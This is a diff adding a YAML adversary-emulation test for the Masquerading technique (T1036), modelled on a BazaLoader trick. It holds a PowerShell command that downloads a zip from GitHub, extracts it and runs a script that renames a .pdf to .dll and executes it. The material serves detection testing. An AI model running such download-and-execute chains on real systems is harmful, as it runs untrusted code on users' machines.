@@ -1,0 +1,23 @@
+- description: When the file is unzipped and the README.cmd file opened, it executes
+    and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique
+    [as reported here](https://twitter.com/ffforward/status/1481672378639912960)
+  id: b3f30f3fd6b58f412ca7f06c4408b6a1
+  name: Malware Masquerading and Execution from Zip File
+  platforms:
+    windows:
+      psh:
+        cleanup: taskkill /IM Calculator.exe /f >$null 2>$null; Remove-Item $env:userprofile\Downloads\T1036
+          -recurse -ErrorAction Ignore
+        command: if (Test-Path $env:userprofile\Downloads\T1036.zip) { ; } else {Invoke-WebRequest
+          -OutFile "$env:userprofile\Downloads\T1036.zip" https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip};  ;  Expand-Archive
+          -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036
+          -Force; cd $env:userprofile\Downloads\T1036; cmd /c $env:userprofile\Downloads\T1036\README.cmd
+          >$null 2>$null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: defense-evasion
+  technique:
+    attack_id: T1036
+    name: Masquerading
